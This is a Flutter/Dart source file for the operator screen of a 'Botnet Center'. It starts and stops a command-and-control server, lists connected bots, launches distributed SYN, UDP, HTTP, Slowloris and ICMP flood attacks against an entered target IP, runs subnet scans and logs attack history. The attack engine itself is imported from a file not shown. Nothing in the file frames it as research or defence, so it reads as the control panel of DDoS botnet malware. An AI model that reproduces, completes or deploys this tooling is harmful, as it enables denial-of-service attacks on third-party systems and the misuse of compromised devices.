import 'package:flutter/material.dart';
import 'dart:async';
import '../../core/botnet/botnet_engine.dart';

class BotnetCenter extends StatefulWidget {
  const BotnetCenter({super.key});

  @override
  State<BotnetCenter> createState() => _BotnetCenterState();
}

class _BotnetCenterState extends State<BotnetCenter> with SingleTickerProviderStateMixin {
  late TabController _tabController;
  final BotnetEngine _engine = BotnetEngine();
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _portController = TextEditingController(text: '5555');
  final TextEditingController _subnetController = TextEditingController(text: '192.168.1');
  
  bool _isServerRunning = false;
  String _selectedAttack = 'SYN Flood';
  int _attackDuration = 30;
  Timer? _statsTimer;
  
  final List<String> _attackTypes = [
    'SYN Flood', 'UDP Flood', 'HTTP Flood', 'Slowloris', 'ICMP Flood'
  ];
  
  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 4, vsync: this);
    _startStatsUpdate();
  }
  
  @override
  void dispose() {
    _tabController.dispose();
    _statsTimer?.cancel();
    if (_isServerRunning) {
      _engine.stopC2Server();
    }
    super.dispose();
  }
  
  void _startStatsUpdate() {
    _statsTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      if (mounted) {
        setState(() {});
      }
    });
  }
  
  Future<void> _startServer() async {
    final port = int.tryParse(_portController.text) ?? 5555;
    await _engine.startC2Server(port: port);
    setState(() {
      _isServerRunning = true;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('C2 Server started on port $port'), backgroundColor: const Color(0xFF00BCD4)),
    );
  }
  
  Future<void> _stopServer() async {
    await _engine.stopC2Server();
    setState(() {
      _isServerRunning = false;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('C2 Server stopped'), backgroundColor: Colors.orange),
    );
  }
  
  Future<void> _launchAttack() async {
    if (_targetController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Enter target IP'), backgroundColor: Colors.red),
      );
      return;
    }
    
    await _engine.launchDistributedAttack(
      _targetController.text,
      _selectedAttack,
      _attackDuration,
    );
    
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Attack launched on ${_targetController.text}'), backgroundColor: const Color(0xFF00BCD4)),
    );
  }
  
  Future<void> _launchScan() async {
    if (_subnetController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Enter subnet'), backgroundColor: Colors.red),
      );
      return;
    }
    
    await _engine.launchDistributedScan(_subnetController.text);
    
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Scan launched on ${_subnetController.text}.0/24'), backgroundColor: const Color(0xFF00BCD4)),
    );
  }
  
  @override
  Widget build(BuildContext context) {
    final stats = _engine.getBotnetStats();
    final bots = _engine.getConnectedBots();
    final history = _engine.getAttackHistory();
    
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text('Botnet Center', style: TextStyle(color: Color(0xFF00BCD4))),
        backgroundColor: Colors.black,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFF00BCD4)),
          onPressed: () => Navigator.pop(context),
        ),
        bottom: TabBar(
          controller: _tabController,
          labelColor: const Color(0xFF00BCD4),
          unselectedLabelColor: Colors.white54,
          indicatorColor: const Color(0xFF00BCD4),
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'Control'),
            Tab(icon: Icon(Icons.devices), text: 'Bots'),
            Tab(icon: Icon(Icons.history), text: 'History'),
            Tab(icon: Icon(Icons.settings), text: 'Settings'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _buildControlTab(stats),
          _buildBotsTab(bots),
          _buildHistoryTab(history),
          _buildSettingsTab(),
        ],
      ),
    );
  }
  
  Widget _buildControlTab(Map<String, dynamic> stats) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          // Server Status Card
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: _isServerRunning 
                    ? [const Color(0xFF00BCD4), const Color(0xFF006064)]
                    : [Colors.grey[800]!, Colors.grey[900]!],
              ),
              borderRadius: BorderRadius.circular(20),
            ),
            child: Column(
              children: [
                Icon(_isServerRunning ? Icons.check_circle : Icons.error, color: Colors.white, size: 50),
                const SizedBox(height: 10),
                Text(
                  _isServerRunning ? 'SERVER ONLINE' : 'SERVER OFFLINE',
                  style: const TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
                ),
                const SizedBox(height: 5),
                Text(
                  'Port: ${stats['server_port']} | Bots: ${stats['active_bots']}',
                  style: const TextStyle(color: Colors.white70),
                ),
                const SizedBox(height: 15),
                Row(
                  children: [
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: _isServerRunning ? null : _startServer,
                        icon: const Icon(Icons.play_arrow),
                        label: const Text('Start Server'),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: _isServerRunning ? _stopServer : null,
                        icon: const Icon(Icons.stop),
                        label: const Text('Stop Server'),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          
          const SizedBox(height: 20),
          
          // Attack Control
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: const Color(0xFF00BCD4).withOpacity(0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('Attack Control', style: TextStyle(color: Color(0xFF00BCD4), fontWeight: FontWeight.bold, fontSize: 16)),
                const SizedBox(height: 15),
                TextField(
                  controller: _targetController,
                  style: const TextStyle(color: Colors.white),
                  decoration: const InputDecoration(
                    labelText: 'Target IP',
                    labelStyle: TextStyle(color: Color(0xFF00BCD4)),
                    border: OutlineInputBorder(),
                    enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Color(0xFF00BCD4))),
                  ),
                ),
                const SizedBox(height: 10),
                DropdownButtonFormField<String>(
                  value: _selectedAttack,
                  dropdownColor: Colors.black,
                  style: const TextStyle(color: Color(0xFF00BCD4)),
                  decoration: const InputDecoration(
                    labelText: 'Attack Type',
                    labelStyle: TextStyle(color: Color(0xFF00BCD4)),
                    border: OutlineInputBorder(),
                  ),
                  items: _attackTypes.map((type) => DropdownMenuItem(value: type, child: Text(type))).toList(),
                  onChanged: (v) => setState(() => _selectedAttack = v!),
                ),
                const SizedBox(height: 10),
                Row(
                  children: [
                    const Text('Duration: ', style: TextStyle(color: Colors.white54)),
                    Expanded(
                      child: Slider(
                        value: _attackDuration.toDouble(),
                        min: 10,
                        max: 300,
                        divisions: 29,
                        activeColor: const Color(0xFF00BCD4),
                        onChanged: (v) => setState(() => _attackDuration = v.toInt()),
                      ),
                    ),
                    Text('$_attackDuration sec', style: const TextStyle(color: Color(0xFF00BCD4))),
                  ],
                ),
                const SizedBox(height: 15),
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton.icon(
                    onPressed: _isServerRunning ? _launchAttack : null,
                    icon: const Icon(Icons.flash_on),
                    label: const Text('Launch Distributed Attack'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.red,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                    ),
                  ),
                ),
              ],
            ),
          ),
          
          const SizedBox(height: 20),
          
          // Scan Control
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: const Color(0xFF00BCD4).withOpacity(0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('Distributed Scan', style: TextStyle(color: Color(0xFF00BCD4), fontWeight: FontWeight.bold, fontSize: 16)),
                const SizedBox(height: 10),
                TextField(
                  controller: _subnetController,
                  style: const TextStyle(color: Colors.white),
                  decoration: const InputDecoration(
                    labelText: 'Subnet (e.g., 192.168.1)',
                    labelStyle: TextStyle(color: Color(0xFF00BCD4)),
                    border: OutlineInputBorder(),
                  ),
                ),
                const SizedBox(height: 15),
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton.icon(
                    onPressed: _isServerRunning ? _launchScan : null,
                    icon: const Icon(Icons.scanner),
                    label: const Text('Launch Distributed Scan'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF00BCD4),
                      foregroundColor: Colors.black,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
  
  Widget _buildBotsTab(List<Map<String, dynamic>> bots) {
    if (bots.isEmpty) {
      return const Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.devices_off, size: 64, color: Colors.white24),
            SizedBox(height: 16),
            Text('No bots connected', style: TextStyle(color: Colors.white38)),
            SizedBox(height: 8),
            Text('Start the server and wait for connections', style: TextStyle(color: Colors.white24, fontSize: 12)),
          ],
        ),
      );
    }
    
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: bots.length,
      itemBuilder: (context, index) {
        final bot = bots[index];
        return Container(
          margin: const EdgeInsets.only(bottom: 12),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.05),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: const Color(0xFF00BCD4).withOpacity(0.3)),
          ),
          child: Row(
            children: [
              Container(
                width: 50,
                height: 50,
                decoration: BoxDecoration(
                  color: const Color(0xFF00BCD4).withOpacity(0.2),
                  borderRadius: BorderRadius.circular(25),
                ),
                child: const Icon(Icons.android, color: Color(0xFF00BCD4), size: 28),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(bot['address'], style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    Text('Connected: ${bot['connected_since']?.substring(0, 19)}', style: const TextStyle(color: Colors.white54, fontSize: 11)),
                    Text('Last heartbeat: ${bot['last_heartbeat']?.substring(0, 19)}', style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: Colors.green.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: const Text('ACTIVE', style: TextStyle(color: Colors.green, fontSize: 10)),
              ),
            ],
          ),
        );
      },
    );
  }
  
  Widget _buildHistoryTab(List<Map<String, dynamic>> history) {
    if (history.isEmpty) {
      return const Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.history, size: 64, color: Colors.white24),
            SizedBox(height: 16),
            Text('No attack history', style: TextStyle(color: Colors.white38)),
          ],
        ),
      );
    }
    
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: history.length,
      itemBuilder: (context, index) {
        final event = history[index];
        final isAttack = event['type'] == 'ddos_launched';
        
        return Container(
          margin: const EdgeInsets.only(bottom: 8),
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.03),
            borderRadius: BorderRadius.circular(10),
          ),
          child: Row(
            children: [
              Icon(
                isAttack ? Icons.flash_on : Icons.scanner,
                color: isAttack ? Colors.red : const Color(0xFF00BCD4),
                size: 24,
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      isAttack ? 'DDoS Attack' : 'Scan',
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                    ),
                    Text(
                      isAttack ? 'Target: ${event['target']}' : 'Subnet: ${event['target']}',
                      style: const TextStyle(color: Colors.white54, fontSize: 11),
                    ),
                    if (isAttack) ...[
                      Text('Type: ${event['attack_type']}', style: const TextStyle(color: Colors.white54, fontSize: 10)),
                      Text('Bots: ${event['bots']}', style: const TextStyle(color: Colors.white54, fontSize: 10)),
                    ],
                    Text(event['timestamp'].toString().substring(0, 19), style: const TextStyle(color: Colors.white38, fontSize: 9)),
                  ],
                ),
              ),
            ],
          ),
        );
      },
    );
  }
  
  Widget _buildSettingsTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.05),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: const Color(0xFF00BCD4).withOpacity(0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('Server Configuration', style: TextStyle(color: Color(0xFF00BCD4), fontWeight: FontWeight.bold)),
              const SizedBox(height: 15),
              TextField(
                controller: _portController,
                style: const TextStyle(color: Colors.white),
                keyboardType: TextInputType.number,
                decoration: const InputDecoration(
                  labelText: 'C2 Server Port',
                  labelStyle: TextStyle(color: Color(0xFF00BCD4)),
                  border: OutlineInputBorder(),
                ),
              ),
              const SizedBox(height: 15),
              const Text('Botnet Statistics', style: TextStyle(color: Color(0xFF00BCD4), fontWeight: FontWeight.bold)),
              const SizedBox(height: 10),
              _buildStatRow('Total Attacks', _engine.getAttackHistory().length.toString()),
              _buildStatRow('Active Bots', _engine.getBotnetStats()['active_bots'].toString()),
              _buildStatRow('Server Status', _isServerRunning ? 'Online' : 'Offline'),
            ],
          ),
        ),
      ],
    );
  }
  
  Widget _buildStatRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label, style: const TextStyle(color: Colors.white54)),
          Text(value, style: const TextStyle(color: Color(0xFF00BCD4), fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }
}
